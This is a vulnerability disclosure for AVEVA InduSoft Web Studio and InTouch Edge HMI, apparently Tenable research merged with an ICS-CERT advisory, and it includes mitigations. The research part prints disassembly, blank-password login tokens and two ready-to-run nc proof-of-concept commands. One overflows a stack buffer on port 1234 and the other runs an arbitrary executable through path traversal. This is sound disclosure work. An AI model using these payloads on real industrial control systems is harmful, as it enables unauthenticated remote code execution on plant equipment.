# [R1] Multiple Vulnerabilities in AVEVA Indusoft Web Studio and InTouch Edge HMI

Critical

[← View More Research Advisories](/security/research)
### Synopsis

While developing a Nessus plugin to detect [CVE-2018-10620](https://www.tenable.com/cve/CVE-2018-10620), Tenable found multiple vulnerabilities in AVEVA InduSoft Web Studio and InTouch Edge HMI.

#### Stack Buffer Overflow

There is a function in **UniSoft.dll** that takes a user-supplied file name and uses it to form a full file path. If the file name is already a full path, it will be copied to an output buffer of fixed size. Otherwise, the file name is concatenated to the same output buffer already containing a base directory (i.e., <PRODUCT\_INSTALL\_DIR>\bin). The vulnerable function does not check the length of the user-specified file name and blindly copies it to a fixed-size buffer:

```

.text:101336F9 append_filename:              ; CODE XREF: sub_10133690+5Dj
.text:101336F9           push    edi         ; buffer overflow:
.text:101336F9                               ; user-supplied filename is concatenated to
.text:101336F9                               ; a fixed-size buffer
.text:101336FA           push    esi         ; pOutFullPath
.text:101336FB           call    ebx ; wcscat
.text:101336FD           jmp     short loc_10133707
.text:101336FF ; ---------------------------------------------------------------------------
.text:101336FF
.text:101336FF copy_filename:                ; CODE XREF: sub_10133690+39j
.text:101336FF                               ; sub_10133690+40j
.text:101336FF           push    edi         ; buffer overflow:
.text:101336FF                               ; user-supplied filename is copied to a
.text:101336FF                               ; fixed-size buffer
.text:10133700           push    esi         ; pOutFullPath
.text:10133701           call    ds:wcscpy

```

When the vulnerable function is invoked as a result of processing a *command 67, function 15* message to the server listening on the default port 1234, a stack buffer (0x600ish bytes) is used as the output buffer to store the full file path. An attacker can specify an overly long file name in the message to overflow a stack buffer. When the Main Password is not set in the project or a Guest account with a blank password is configured in the project, this vulnerability could allow an unauthenticated, remote attacker to cause a stack buffer overflow on the remote host. The following is a proof of concept for when the Main Password is not set:

```

cat <(echo -n '02311031103810321032030245000000000000000000000000fffeff0852006500730065007200760065006400fffeff0852006500730065007200760065006400fffeff00fffeff314400690073007400720069006200750074006500640054006f006b0065006e007c0032003300390033006200660038003500350037006100330062006400610038006600330031003900370038003700370061003700640031006600350062006500fffeff204800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480000000000030243313509'$(python -c "print '41'*0x500")'09736f6d655f737472093130300a03' | xxd -r -p) - | nc <target> 1234

```

Note that the Technical Reference for IWS SP1 mentions 'By default, "Guest" has no password', and the Main Password is optional. To login as Guest with a blank password, the attacker sends a command 69 message with *username='Guest', credentials ='c72e49742b20b3672482f70c17f95902'*. To login with a blank Main Password, the attacker sends a command 69 message with *username='DistributedToken|2393bf8557a3bda8f3197877a7d1f5be'*.

Also, note that a *command 67, function 15* message only requires permission 1 to execute. So it seems low-privileged users can also trigger the stack buffer overflow.

#### Remote Command Execution

The *MTCheckFileFunctionsTimeout* function in **UniSoft.dll** does not check the user-supplied executable file name that is used to create a process. If the file name is already a full path, it will be passed as the *lpCommandLine* parameter to a *CreateProcessW* call. Otherwise, the file name is appended to *<PRODUCT\_INSTALL\_DIR>\bin\* and the combined full path is then passed to *CreateProcessW*. This function can be invoked via a *'command 67, function 15'* message sent to the server listening on the default port 1234. An attacker can specify a full executable file path or using path traversal (i.e., *..\..\..\..\..\..\..\C:\Windows\System32\calc.exe*) to run arbitrary OS commands remotely:

```

.text:1016E850           push    '"'         ; opening quote of the double-quoted
.text:1016E850                               ; full exe path
.text:1016E852           pop     eax
.text:1016E853           mov     [ebp+var_commandline], ax
.text:1016E85A use user-supplied file name to form a full path.
.text:1016E85A if the file name is already a full path, copy it to
.text:1016E85A the output buffer. Otherwise, append it to
.text:1016E85A \bin\ then copy
.text:1016E85A the combined string to the output buffer.
.text:1016E85A           lea     eax, [ebp+var_fullpath] ; output buffer
.text:1016E860           push    eax         ; wchar_t *
.text:1016E861           push    esi         ; user-supplied file name
.text:1016E862           call    _APUniSoftBinPath@8 ; APUniSoftBinPath(x,x)
.text:1016E867           lea     eax, [ebp+var_commandline]
.text:1016E86D           push    offset asc_101D49C4 ; closing quote of the double-quoted
.text:1016E86D                               ; full exe path
.text:1016E872           push    eax
.text:1016E873           call    ds:wcscat
[...]
.text:1016E8C7           lea     eax, [ebp+var_commandline] ; Remote command execution:
.text:1016E8C7                               ; user-specified exe can be passed to
.text:1016E8C7                               ; CreateProcessW()
.text:1016E8CD           push    eax         ; lpCommandLine
.text:1016E8CE           push    edi         ; lpApplicationName
.text:1016E8CF           call    ds:CreateProcessW

```

Based on the error message 'FileFunctions.exe could not be executed!!!' in **UniSoft.dll**, it seems the function intends to execute FileFunctions.exe under *<PRODUCT\_INSTALL\_DIR>\bin\*. When the Main Password is not set in the project or a Guest account with a blank password is configured in the project, the *MTCheckFileFunctionsTimeout* function could allow an unauthenticated remote attacker to run arbitrary commands on the remote host. Below is a proof of concept that executes **calc.exe** for a project with no main password:

```

cat <(echo -n '02311031103810321032030245000000000000000000000000fffeff0852006500730065007200760065006400fffeff0852006500730065007200760065006400fffeff00fffeff314400690073007400720069006200750074006500640054006f006b0065006e007c0032003300390033006200660038003500350037006100330062006400610038006600330031003900370038003700370061003700640031006600350062006500fffeff204800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480048004800480000000000030243313509433a5c57696e646f77735c53797374656d33325c63616c632e65786509736f6d655f737472093130300a03' | xxd -r -p) - | nc <target> 1234

```

While Aveva didn't directly patch this path traversal they did mitigate it by enabling stronger authentication by default amongst other things. See their advisory for me details.

Last RevisedNovember 01, 2018
Alert CodeICSA-18-305-01

## 1. EXECUTIVE SUMMARY

* **CVSS v3 9.8**
* **ATTENTION:** Exploitable remotely/low skill level to exploit
* **Vendor:** AVEVA Software, LLC. (AVEVA)
* **Equipment:** InduSoft Web Studio and InTouch Edge HMI (formerly InTouch Machine Edition)
* **Vulnerabilities:** Stack-based Buffer Overflow, Empty Password in Configuration File

## 2. RISK EVALUATION

Successful exploitation of these vulnerabilities could allow an unauthenticated user to remotely execute code.

## 3. TECHNICAL DETAILS

### 3.1 AFFECTED PRODUCTS

AVEVA reports that these vulnerabilities affect the following products:

* InduSoft Web Studio versions prior to 8.1 SP2, and
* InTouch Edge HMI (formerly InTouch Machine Edition) versions prior to 2017 SP2

### 3.2 VULNERABILITY OVERVIEW

### 3.2.1    [STACK-BASED BUFFER OVERFLOW CWE-121](https://cwe.mitre.org/data/definitions/121.html)

A remote attacker could send a carefully crafted packet to exploit a stack-based buffer overflow vulnerability during tag, alarm, or event related actions such as read and write, with potential for code to be executed. If InduSoft Web Studio remote communication security was not enabled, or a password was left blank, a remote user could send a carefully crafted packet to invoke an arbitrary process, with potential for code to be executed. The code would be executed under the privileges of the InduSoft Web Studio or InTouch Edge HMI runtime and could lead to a compromise of the InduSoft Web Studio or InTouch Edge HMI server machine.

[CVE-2018-17916](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-17916) has been assigned to this vulnerability. A CVSS v3 base score of 9.8 has been assigned; the CVSS vector string is ([AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)).

### 3.2.2    [EMPTY PASSWORD IN CONFIGURATION FILE CWE-258](https://cwe.mitre.org/data/definitions/258.html)

This vulnerability could allow an unauthenticated user to remotely execute code with the same privileges as that of the InduSoft Web Studio or InTouch Edge HMI (formerly InTouch Machine Edition) runtime.

[CVE-2018-17914](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-17914) has been assigned to this vulnerability.

## 4. MITIGATIONS

AVEVA recommends that users upgrade to InduSoft Web Studio v8.1 SP2 and InTouch Edge HMI (formerly InTouch Machine Edition) 2017 SP2 as soon as possible. Software updates can be downloaded from the Global Customer Support “Software Download” area or from the links below:

* InduSoft Web Studio prior to v8.1 SP2:

<http://download.indusoft.com/81.2.0/IWS81.2.0.zip>

* InTouch Edge HMI (formerly InTouch Machine Edition) prior to 2017 SP2 (login required):

<https://softwaresupportsp.schneider-electric.com/#/producthub/details?id=5223>

AVEVA recommends that users update existing projects to enable the security features of InduSoft Web Studio and InTouch Edge HMI:

* Enable the new encrypted channel for communication and disable the unencrypted channel.
* Set a strong Master Project password.
* Set a strong password for the built-in account. By default, the built-in account is named Guest.
* Set strong passwords for all other non-built-in accounts.

AVEVA has published Security Bulletin LFSEC00000130 on their website at the following location:

<https://sw.aveva.com/hubfs/assets-2018/pdf/security-bulletin/SecurityBulletin_LFSec130.pdf>

NCCIC recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are [not accessible from the Internet](/ics/alerts/ICS-ALERT-10-301-01).
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize that VPN is only as secure as the connected devices.

NCCIC reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

NCCIC also provides a section for [control systems security recommended practices](/ics/content/recommended-practices) on the ICS-CERT web page. Several recommended practices are available for reading and download, including [Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies](/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf).

Additional mitigation guidance and recommended practices are publicly available on the [ICS-CERT website](/ics/) in the Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](/ics/tips/ICS-TIP-12-146-01B).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to NCCIC for tracking and correlation against other incidents.

No known public exploits specifically target these vulnerabilities.
